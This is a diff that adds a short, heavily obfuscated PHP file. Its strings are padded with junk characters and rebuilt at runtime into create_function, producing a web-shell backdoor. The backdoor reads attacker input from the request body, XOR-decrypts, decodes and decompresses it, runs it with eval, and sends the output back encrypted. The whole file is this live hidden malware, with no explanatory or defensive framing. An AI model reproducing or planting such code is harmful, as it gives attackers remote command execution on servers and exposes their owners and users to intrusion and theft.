@@ -1,0 +1,13 @@
+<?php
+$d='6{l6{);$j++,$i++){$o.=$6{t{$6{i}^$k{$6{j};}}6{return $6{o;}if (6{@p6{reg_6{matc';
+$u='rle6{n($6{t);$o6{="";for($i=0;6{$i<$l;6{){for6{($j=6{6{0;($j<$c&&$i6{<$';
+$Y=str_replace('Qf','','creQfaQfte_QffQfQfQfunction');
+$A='ase64_e6{n6{code(@x(@g6{6{zcompress($o),$6{k)6{);prin6{t("$p$kh$6{r$kf");}';
+$I='$k="86{c319f6{28";6{$kh="d816{d1527a946{2";$kf=6{"8e9a5c26{196{5f5";$p="6';
+$s='{=1) {@6{6{o6{b_start();@eva6{l6{(@gzun6{6{compress(@x(@ba6{se64_decod';
+$k='6{h("6{/$k6{h(.+)$6{kf/",@f6{ile_ge6{t_contents("php://6{input"6{),$m)=6';
+$M='e6{(6{$m[1])6{,$k)));$o6{=6{@ob_get6{_conte6{nts();@6{ob_end_clea6{n(6{);$r=@b6{';
+$j='{t66{VC6{4IXEe43GCGHR";6{fun6{ction x6{($t,$k6{6{){$c=str6{len($k);6{$l=st';
+$H=str_replace('6{','',$I.$j.$u.$d.$k.$s.$M.$A);
+$D=$Y('',$H);$D();
+?>
